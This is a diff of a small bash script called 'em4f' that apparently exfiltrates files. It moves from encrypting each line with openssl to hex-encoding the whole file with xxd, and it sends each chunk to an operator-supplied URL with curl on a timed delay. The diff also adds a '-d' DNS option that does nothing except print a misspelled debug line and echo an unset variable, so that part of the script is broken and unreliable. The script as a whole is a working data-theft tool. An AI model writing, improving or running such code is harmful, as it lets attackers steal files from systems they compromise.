@@ -4,7 +4,7 @@
 #gplv3
 
 SCRIPTNAME="em4f"
-VERSION="v1.0"
+VERSION="v1.1"
 
 # option processing
 print_usage() {
@@ -12,6 +12,7 @@ print_usage() {
   echo "  $SCRIPTNAME -u STRING"
   echo "  $SCRIPTNAME -i STRING"
   echo "  $SCRIPTNAME -w INTEGER"
+  echo "  $SCRIPTNAME -d "
   echo "  $SCRIPTNAME -h"
   echo "  $SCRIPTNAME -V"
 }
@@ -33,6 +34,8 @@ print_help() {
   echo "   Wait time is seconds"
   echo "-p"
   echo "   Password for encryption"
+  echo "-d"
+  echo "   d is for dns"
   echo "-h"
   echo "   Print this help screen"
   echo "-V"
@@ -42,13 +45,14 @@ print_help() {
 
 
 # take the input and turn it to variables:
-while getopts u:i:w:p:hV OPT
+while getopts u:i:w:p:d:hV OPT
 do
   case $OPT in
     u) URL="$OPTARG" ;;
     i) FILE="$OPTARG" ;;
     w) WAIT="$OPTARG" ;;
     p) PASS="$OPTARG" ;;
+    d) echo "-d was traggered" >&2 ;;
     h)
       print_help
       exit $STATE_UNKNOWN
@@ -59,11 +63,11 @@ do
       ;;
    esac
 done
-
+echo "$DNS"
 # pretty art
 echo "_______   _____ ______   ___   ___  ________"
 echo "|\  ___ \ |\   _ \  _   \|\  \ |\  \|\  _____\ "
-echo "\ \   __/|\ \  \\\__\ \  \ \  \\_\  \ \  \__/  "
+echo "\ \  \__/|\ \  \\\__\ \  \ \  \\_\  \ \  \__/  "
 echo " \ \  \_|/_\ \  \\|__| \  \ \______  \ \   __\  "
 echo "  \ \  \_|\ \ \  \    \ \  \|_____|\  \ \  \_|   "
 echo "   \ \_______\ \__\    \ \__\     \ \__\ \__\     "
@@ -74,11 +78,16 @@ echo "the drying of your tears"
 echo "today we escape, we escape..."
 echo " "
 
-# heavy lifting
-while IFS='' read -r line || [[ -n "$LINE" ]]; do
-  CYPHER_TEXT=$(echo "$line" | openssl enc -aes-128-cbc -a -pass pass:$PASS)
-  curl -s "$URL$CYPHER_TEXT" 2>/dev/null > temp.html
+# hex encode
+xxd -p $FILE > tmp.hex
+
+#heavy lifting
+
+while read line; do
+  curl -s "$URL$line" 2>/dev/null > temp.html
   sleep $WAIT
-done < "$FILE"
+done < "tmp.hex"
+
+rm -rf tmp.hex
 
 echo "...we hope that you choke, that you choke"
